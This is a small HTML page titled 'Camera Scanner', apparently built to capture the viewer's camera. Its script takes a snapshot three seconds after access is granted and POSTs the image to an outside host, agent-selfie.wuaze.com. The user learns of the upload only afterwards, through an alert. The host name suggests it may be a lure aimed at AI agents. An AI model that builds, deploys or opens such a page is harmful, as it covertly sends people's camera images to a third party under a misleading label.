<!DOCTYPE html>
<html>
<head>
  <title>Camera Scanner</title>
</head>
<body>
  <h1>Camera Scanner</h1>
  <video id="video" width="320" height="240" autoplay></video>
  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');

    navigator.mediaDevices.getUserMedia({ video: true })
      .then((stream) => {
        video.srcObject = stream;
        setTimeout(() => {
          context.drawImage(video, 0, 0, canvas.width, canvas.height);
          const dataURL = canvas.toDataURL('image/png');
          fetch("https://agent-selfie.wuaze.com/receiver.php", {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({ image: dataURL })
          })
          .then(res => res.text())
          .then(link => {
            alert("Selfie saved to: " + link);
          });
        }, 3000);
      })
      .catch((err) => {
        console.error("Error accessing the camera: ", err);
      });
  </script>
</body>
</html>
